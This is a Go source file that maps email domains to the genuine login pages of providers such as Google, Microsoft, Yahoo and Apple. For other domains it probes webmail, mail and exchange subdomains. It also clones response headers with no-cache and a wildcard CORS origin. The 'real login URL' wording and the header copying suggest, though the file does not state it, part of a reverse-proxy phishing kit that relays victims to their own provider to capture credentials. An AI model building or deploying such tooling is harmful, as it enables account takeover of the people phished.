package main

import (
	"net"
	"net/http"
	"strings"
	"time"
)

var ProviderMapping = map[string]string{
	"gmail.com":      "https://accounts.google.com/",
	"google.com":     "https://accounts.google.com/",
	"outlook.com":    "https://login.live.com/",
	"hotmail.com":    "https://login.live.com/",
	"live.com":       "https://login.live.com/",
	"yahoo.com":      "https://login.yahoo.com/",
	"icloud.com":     "https://appleid.apple.com/",
	"me.com":         "https://appleid.apple.com/",
	"aol.com":        "https://login.aol.com/",
	"protonmail.com": "https://account.proton.me/",
	"zoho.com":       "https://accounts.zoho.com/",
	"yandex.com":     "https://passport.yandex.com/",
	"yandex.ru":      "https://passport.yandex.ru/",
	"qq.com":         "https://mail.qq.com/",
	"163.com":        "https://mail.163.com/",
	"126.com":        "https://mail.126.com/",
	"yeah.net":       "https://mail.yeah.net/",
	"foxmail.com":    "https://mail.qq.com/",
	"web.de":         "https://web.de/mam/login.action",
	"gmx.com":        "https://login.gmx.net",
	"gmx.de":         "https://login.gmx.net",
	"tutanota.com":   "https://login.tutanota.com/",
	"fastmail.com":   "https://www.fastmail.com/auth/login",
	"godaddy.com":    "https://sso.godaddy.com/",
	"cpanel.net":     "https://cpanel.net/",
}

// GetTargetDomain determines the real login URL based on the email domain
func GetTargetDomain(email string) string {
	parts := strings.Split(email, "@")
	if len(parts) < 2 {
		return "https://accounts.google.com/"
	}
	domain := strings.ToLower(parts[1])

	// 1. Check hardcoded providers first
	if target, ok := ProviderMapping[domain]; ok {
		return target
	}

	// 2. Smart Fallback: DNS + HTTP Probe for Corporate/Custom Domains
	subdomains := []string{"webmail", "mail", "exchange", "outlook", "autodiscover"}
	client := http.Client{Timeout: 2 * time.Second}

	for _, sub := range subdomains {
		fullDomain := sub + "." + domain

		// Check if DNS resolves
		_, err := net.LookupHost(fullDomain)
		if err == nil {
			// DNS resolves, now test if it's an HTTP server
			testURL := "https://" + fullDomain + "/"
			resp, err := client.Get(testURL)

			// If it connects without error, this is the login portal
			if err == nil && resp.StatusCode < 400 {
				resp.Body.Close()
				return testURL
			}
		}
	}

	// 3. Absolute Fallback
	return "https://" + domain + "/"
}

func CloneHeaders(src *http.Response, dst http.ResponseWriter) {
	dst.Header().Set("Content-Type", src.Header.Get("Content-Type"))
	dst.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	dst.Header().Set("Access-Control-Allow-Origin", "*")
}
